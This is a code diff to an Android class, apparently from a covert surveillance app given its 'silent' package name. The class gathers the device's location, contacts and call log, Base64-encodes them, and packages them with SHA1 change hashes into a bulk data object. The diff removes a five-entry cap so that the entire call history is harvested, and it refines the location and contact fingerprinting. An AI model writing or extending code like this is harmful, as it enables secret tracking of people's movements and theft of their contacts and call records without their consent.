@@ -40,7 +40,6 @@ import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
-import src.silent.models.ContactModel;
 import src.silent.models.SmsModel;
 import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.LocationHandler;
@@ -99,6 +98,8 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
                     120000) {
 
+                shaString += String.valueOf(location.getLatitude());
+                shaString += String.valueOf(location.getLongitude());
 
                 locationData.put("Latitude",
                         Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
@@ -122,6 +123,8 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 locationManager.requestSingleUpdate(criteria, locationHandler, null);
                 Looper.loop();
 
+                shaString += locationHandler.getLatitude();
+                shaString += locationHandler.getLongitude();
                 locationData.put("Latitude",
                         Base64.encodeToString(locationHandler.getLatitude().getBytes(),
                                 Base64.URL_SAFE));
@@ -130,8 +133,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                                 Base64.URL_SAFE));
             }
 
-            if (locationData.hashCode() != Integer.parseInt(hash)) {
-                locationData.put("Hash", locationData.hashCode());
+            if (!SHA1Helper.SHA1(shaString).equals(hash)) {
+                locationData.put("Hash", Base64.encodeToString(SHA1Helper.SHA1(shaString)
+                        .getBytes(), Base64.URL_SAFE));
                 bulkData.put("Location", locationData);
             }
 
@@ -179,7 +183,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
     }
 
     private void getContacts(JSONObject bulkData, String hash) {
-        List<ContactModel> list = new ArrayList<>();
         ContentResolver contentResolver = params.getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -189,7 +192,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 JSONObject contacts = new JSONObject();
                 JSONArray informationArray = new JSONArray();
                 String shaString = "";
-                Boolean flag = false;
                 while (cursor.moveToNext()) {
                     String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                     if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
@@ -215,10 +217,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         cursorInfo.moveToFirst();
                         if (!numbers.contains(cursorInfo.getString(cursorInfo.
                                 getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                                .trim())) {
+                                .replace(" ", ""))) {
                             numbers.add(cursorInfo.getString(cursorInfo.
                                     getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                                    .trim());
+                                    .replace(" ", ""));
                             shaString += cursor.getString(cursor
                                     .getColumnIndex(ContactsContract.
                                             Contacts.DISPLAY_NAME));
@@ -275,8 +277,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 JSONArray informationArray = new JSONArray();
                 String shaString = "";
                 boolean flag = false;
-                int counter = 5;
-                while (managedCursor.moveToNext() && counter != 0) {
+                while (managedCursor.moveToNext()) {
                     shaString += managedCursor.getString(number);
                     Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
                     shaString += cal.toString();
@@ -297,7 +298,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     information.put("Direction",
                             Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
                     informationArray.put(information);
-                    counter--;
                 }
                 managedCursor.close();
 
